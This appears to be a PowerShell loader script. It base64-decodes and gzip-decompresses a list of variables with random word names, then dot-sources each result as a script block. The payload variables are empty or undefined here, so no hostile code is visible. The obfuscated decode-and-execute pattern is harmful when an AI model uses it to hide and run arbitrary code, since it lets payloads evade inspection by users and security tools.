$Phantasied = ""
$Mistassini = ""
$Facilities = ""
$Publishers = ""
$Configured = ""
$Magellanic = ""
$Calamities = ""
$Saccharine = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Bookmaking,$Execrating,$Painfuller,$Jitteriest,$Downgrades,$Uncleanest,$Shuddering,$Complacent,$Wiesenthal,$Hammerings,$Injunction,$Vibrations,$Minuscules,$Discourage,$Reappraise,$Phantasied,$Mistassini,$Facilities,$Publishers,$Configured,$Magellanic,$Calamities,$Saccharine)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    $Decompressed = ConvertFrom-Gzip -Bytes $Decoded
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decompressed)
    . $ScriptBlock
}
